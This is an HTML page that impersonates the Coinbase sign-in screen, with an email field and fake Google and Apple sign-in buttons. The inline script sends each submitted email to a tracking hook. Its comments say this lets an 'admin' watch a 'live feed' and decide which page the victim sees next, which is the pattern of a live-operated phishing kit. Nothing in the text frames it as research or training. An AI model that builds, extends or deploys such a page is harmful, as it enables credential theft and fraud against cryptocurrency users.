<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Sign in to Coinbase</title>
  <link rel="stylesheet" href="style.css"/>
</head>

<body>

  <!-- Top left logo -->
  <div class="logo">
    <div class="logo-circle"></div>
  </div>

  <!-- Center content -->
  <div class="container">

    <h1>Sign in to Coinbase</h1>

    <input id="email" name="email" type="email" placeholder="Enter your email" autocomplete="email"/>

    <button id="continueBtn" class="primary" type="button" disabled aria-disabled="true">Continue</button>

    <div class="divider">
      <span></span>
      <p>OR</p>
      <span></span>
    </div>

    <button class="social">
      <img src="https://www.svgrepo.com/show/475656/google-color.svg">
      Sign in with Google
    </button>

    <button class="social">
      <svg viewBox="0 0 24 24">
        <path fill="white" d="M16.365 1.43c0 1.14-.47 2.23-1.22 3.03-.78.82-2.05 1.45-3.2 1.36-.15-1.12.4-2.3 1.13-3.1.8-.87 2.16-1.5 3.29-1.29zM20.5 17.21c-.83 1.2-1.23 1.73-2.3 2.97-1.48 1.7-3.57 3.83-6.1 3.85-2.23.02-2.8-1.45-5.8-1.43-3 .02-3.62 1.46-5.85 1.44-2.53-.02-4.5-1.93-5.98-3.62C.98 18.2-.02 13.9 1.9 10.92c1.37-2.12 3.54-3.35 5.57-3.35 2.09 0 3.4 1.45 5.8 1.45 2.32 0 3.73-1.45 5.79-1.45 1.8 0 3.7.98 5.06 2.66-4.45 2.44-3.73 8.77.38 11z"/>
      </svg>
      Sign in with Apple
    </button>

    <p class="signup">
      Don't have an account? <a href="#">Sign up</a>
    </p>

  </div>

  <!-- Footer -->
  <div class="footer">
    See our <a href="#">Cookie Policy</a> and <a href="#">Privacy Policy</a>
    for more information on how we process your personal data.
  </div>

  <script>
    (function () {
      var input = document.getElementById('email');
      var btn = document.getElementById('continueBtn');

      function isValid(v) {
        return /@/.test(v || '');
      }

      function sync() {
        var ok = isValid(input.value);
        btn.disabled = !ok;
        btn.setAttribute('aria-disabled', ok ? 'false' : 'true');
        btn.classList.toggle('is-ready', ok);
      }

      input.addEventListener('input', sync);
      sync();

      btn.addEventListener('click', function () {
        if (btn.disabled) return;
        var email = input.value.trim();
        // Record the submission so the admin sees it in the live feed.
        try { window.track && window.track('email_submitted', email); } catch (e) {}
        try { window.track && window.track('continue_clicked', '1'); } catch (e) {}
        // Visual feedback while the admin decides the next page.
        btn.classList.add('is-loading');
        btn.textContent = 'Waiting…';
      });

      // Submit on Enter inside the email field.
      input.addEventListener('keydown', function (e) {
        if (e.key === 'Enter' && !btn.disabled) {
          e.preventDefault();
          btn.click();
        }
      });
    })();
  </script>

</body>
</html>
